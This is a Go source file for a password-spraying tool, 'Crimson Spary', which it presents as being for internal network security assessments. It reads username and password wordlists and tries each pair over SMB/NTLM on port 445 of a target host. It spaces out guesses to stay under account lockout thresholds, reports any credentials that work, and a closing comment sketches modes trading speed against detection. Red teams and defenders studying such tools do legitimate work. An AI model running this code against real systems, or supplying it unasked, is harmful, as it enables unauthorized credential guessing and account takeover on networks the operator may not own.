package main

import (
	"bufio"
	"fmt"
	"github.com/akamensky/argparse"
	"github.com/hirochachacha/go-smb2"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

func main() {
	parser := argparse.NewParser("Crimson Spary","An smart password sprayer for Internal network security assessments.")
	var userFilePathArg = parser.String("u","username-file",&argparse.Options{Required: true,Help: "File of users separated by newlines"})
	var passFilePathArg = parser.String("p","password-file",&argparse.Options{Required: true,Help: "File of passwords seperated by newlines. A good wordlist generator can be found at https://weakpass.com/generate"})
	var domainArg = parser.String("d","domain",&argparse.Options{Required: true})
	var targetArg = parser.String("t","target",&argparse.Options{Required: true,Help: "IP or Hostname of target to authenticate against."})
	var lockThresh = parser.Int("a","Lockout-Threshold",&argparse.Options{Required: true,Help: "Number of passwords attempts before lockout. Attempts will not exceed this amount - 1."})
	var lockThreshTime  = parser.Int("l","Lockout-Reset",&argparse.Options{Required: true,Help: "Duration of time in minutes for the threshold timer to elapse. An addition minute is added."})
	var lockTime = parser.Int("r","Lockout-Timer",&argparse.Options{Required: true,Help: "Duration of time in minutes for an locked out account to become unlocked. If account lockout is detected, program will wait this time + 1 minute."})
	var verboseArg = parser.Flag("v","verbose",&argparse.Options{Default: false,Help: "Print Debug"})
	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
	}

	multiSpray(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime ,*lockTime,*verboseArg)
}

func singleUserSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int64,verbose bool) {
	userList := readFile(usernamePath)
	passwordList := readFile(passwordPath)
	resetTimerDuration := lockoutResetTimer + 1
	attemptThreshold := lockoutThreshold - 1
	currentPasswordIndex := 0
	for _, users := range userList {

		for currentPasswordIndex < len(passwordList) {
			result := 4
			for i := 0; i < attemptThreshold; i++ {
				passwordToAttempt := passwordList[currentPasswordIndex+i]
				result = testCred(users, passwordToAttempt, domain, targetIP,verbose)
				if result == 0 {
					break
				} else if result == 2 {
					fmt.Printf("User account %s is locked out.\n", users)
					break
				}
				currentPasswordIndex++
			}
			if result == 0 {
				break
			}
			fmt.Printf("Sleeping for %d mins\n", resetTimerDuration)
			time.Sleep(time.Duration(resetTimerDuration) * time.Minute)

		}
	}

}

func multiSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int,verbose bool){
	userList := readFile(usernamePath)
	var wg sync.WaitGroup
	for x := range userList{
		wg.Add(1)
		useruser := userList[x]
		//UserSpray(y, passwordPath, domain, targetIP, lockoutThreshold, lockoutResetTimer, lockoutTimer)
		go func() {
			defer wg.Done()
			UserSpray(useruser, passwordPath, domain, targetIP, lockoutThreshold, lockoutResetTimer, lockoutTimer,verbose)
		}()
	}
	wg.Wait()

}

func UserSpray(username string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose bool) string {

	passwordList := readFile(passwordPath)
	resetTimerDuration := int(lockoutResetTimer + 1)
	attemptThreshold := lockoutThreshold - 2
	currentPasswordIndex := 0
	for currentPasswordIndex < len(passwordList)+1 {
		result := 4 //
		for i := 0; i < attemptThreshold; i++ {
			passwordToAttempt := passwordList[currentPasswordIndex]
			result = testCred(username, passwordToAttempt, domain, targetIP,verbose)
			if result == 0 {
				break
			} else if result == 2 {
				timePrint(fmt.Sprintf("User account %s is locked out. Lockout out ends in %d mintues\n", username, lockoutTimer+1))
				time.Sleep(time.Duration(lockoutTimer+1) * time.Minute)
			}
			currentPasswordIndex++
		}
		if result == 0 {
			break
		}
		timePrint(fmt.Sprintf("Threshold for %s resets in %d mins\n", username,resetTimerDuration))
		time.Sleep(time.Duration(resetTimerDuration) * time.Minute)

	}
	return fmt.Sprintf("Done user %s",username)
}

func testCred(name string, passwordGuess string, domainDst string, ip string,verbose bool) int {
	/* Return Values
	0 - Log in successful
	1 - Log in failed
	2 - Specified account is locked out
	3 - Reserved
	4 - Default first loop. This should never be returned
	*/
	dstServer := fmt.Sprintf("%s:445", ip)
	if verbose{
		log.Printf("Attempting to connect to %s",dstServer)
	}
	conn, err := net.Dial("tcp", dstServer)
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	if verbose {
		log.Printf("Connected to %s",dstServer)
		log.Printf("Attempting %s\\%s:%s @ %s --- ", domainDst, name, passwordGuess, dstServer)
	}
	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     name,
			Password: passwordGuess,
			Domain:   domainDst,
		},
	}
	_, err = d.Dial(conn)
	if err != nil {
		if verbose{
			log.Print(err.Error())
		}
		if strings.Contains(err.Error(), "automatically locked because too many invalid logon attempts") {
			return 2
		} else {
			timePrint(fmt.Sprintf("Failed %s:%s\n",name,passwordGuess))
			return 1
		}
	} else {
		timePrint(fmt.Sprintf("Found %s:%s\n",name,passwordGuess))
		return 0
	}

}

func sannityCheckIP(ip string) bool {
	fmt.Printf("Testing connection to %s\n", ip)
	dstServer := fmt.Sprintf("%s:445", ip)
	_, err := net.Dial("tcp", dstServer)
	if err != nil {
		return false
	} else {
		return true
	}
}

func readFile(filepath string) []string {
	filebytes, err := os.Open(filepath)
	if err != nil {
		log.Fatalf("Failed to open %s", filepath)
	}
	scanner := bufio.NewScanner(filebytes)
	scanner.Split(bufio.ScanLines)
	var entries []string
	for scanner.Scan() {
		entries = append(entries, scanner.Text())
	}
	return entries
}

func timePrint(text string){
	currentTime := time.Now()
	fmt.Printf("%s: %s",currentTime.Format("2006/01/02 03:04:05 pm"),text)
}

/* Modes:
1: Rush - Attempts burst in short amount of time for all users upto lockout threshold - more likely to be detected
2: Distributed - Attempts distributed along a timeline
3: Single user mode - Will do attempts for single users at a time.

Options:
Safe start - Will wait the lockout reset time before it begins first round of testing
caution - Will check for lockout status before each attempt


*/


func contains(s []string, str string) bool {
	for _, v := range s {
		if v == str {
			return true
		}
	}

	return false
}


